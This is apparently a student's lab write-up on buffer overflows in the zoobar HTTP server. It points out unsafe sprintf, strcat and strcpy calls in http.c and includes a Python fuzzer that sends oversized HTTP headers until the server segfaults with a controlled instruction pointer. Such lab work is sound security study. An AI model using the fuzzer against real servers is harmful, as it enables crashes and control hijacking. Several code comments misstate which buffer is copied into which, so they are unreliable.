## Place your answers here.

Exercise 1:

I first started to look for any vulnerable functions within the program that are known to be vulnerable to buffer overflows. OWASP states the following: "C library functions such as strcpy (), strcat (), sprintf () and vsprintf () operate on null terminated strings and perform no bounds checking." So these particular functions were the ones I was interested in if they were being used by the program.

[http.c:165] 
The program allocates 8192 bytes for the variable 'buf' and 512 bytes for the variable 'envvar'. The envvar variable can be overwritten by the sprintf function, because it does not perform any bounds checking for the buffer size.

    static char buf[8192];   // Here the program allocates the 8192 bytes for the variable 'buf'
    char envvar[512]; // Here it allocates 512 bytes for the variable 'envvar'
    ...
    ...
    ...
    sprintf(envvar, "HTTP_%s", buf); // Here sprintf will copy the content of envvar to buf

If the input exceeds the 512 byte limit it will overflow the buffer and we as an attacker will have control of the execution of the program. There are also other functions that does not perform bound checking and are prone to buffer overflow related attacks. 

------

[http.c:282]
In the 'http_serve' function the program allocates 1024 bytes for a variable 'pn'. Then it uses the vulnerable 'strcat' function that does not perform bounds checking when concatenating to destination 'name'.

    void http_serve(int fd, const char *name)
    {
    void (*handler)(int, const char *) = http_serve_none;
    char pn[1024];
    struct stat st;

    getcwd(pn, sizeof(pn));
    setenv("DOCUMENT_ROOT", pn, 1);

    strcat(pn, name); // Here it uses the strcat function to append a copy of the source string to the destination variable 'name'

If we as an attacker provide more than the allocated 1024 bytes in the buffer for the 'pn' variable we can overflow the buffer.

------

[http.c:344]
In the 'dir_join' function the program uses another vulnerable function - strcpy, which does not check buffer lengths and just copies given input into the buffer.

    strcpy(dst, dirname); // Here the program uses strcpy function to copy the 'dst' variable input into 'dirname' variable

------

[http.c:347]
In the 'dir_join' function the program also uses 'strcat', which does not check buffer lengths and just concatenates user input as is.

    strcat(dst, filename); // Here the program uses strcat function to copy the 'dst' variable input into 'filename' variable

------

For the second vulnerability we chose to exploit was how the zoobar HTTP server handles HTTP requests headers. If we as an attacker create an arbitrary header that exceeds the 'envvar' variable 512 bytes, we successfully corrupt the memory of the zoobar process.

    # Fuzzed HTTP Requests trying to find
    # the maximum size that the server
    # can handle

    import sys, socket, time
    
    # Use in the form "python httpfuzz.py host port"

    host = sys.argv[1] # Recieve IP from user
    port = int(sys.argv[2]) # Recieve Port from user

    length = 100 # Initial length of 100 A's

    while (length < 11000): # Stop once we've tried up to 3000 length
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
        client.connect((host, port)) # Connect to user supplied port and IP address

        command = "GET / HTTP/1.1\r\nHost: " + host + "HTTP_" + length * "B" + ": foo" + "\r\nConnection: Close\r\n\r\n"
        client.send(command) # Send the user command with a variable length name
        data = client.recv(1024) # Recieve Reply
        client.close() # Close the Connection
        time.sleep(2)
        print "Length Sent: " + str(length) # Output length of the request
        length += 100 # Try again with an increased length

The memory corruption happens after we have sent little over 500 bytes:

    Length Sent: 500
    Traceback (most recent call last):
      File "fuzzer.py", line 20, in <module>
        data = client.recv(1024) # Recieve Reply
    socket.error: [Errno 54] Connection reset by peer

If we look at the status of dmesg, we can see the following:

    [ 9611.046876] zookfs-exstack[3471]: segfault at 42424242 ip 42424242 sp bfffde00 error 14

------
Word about stack canaries here 
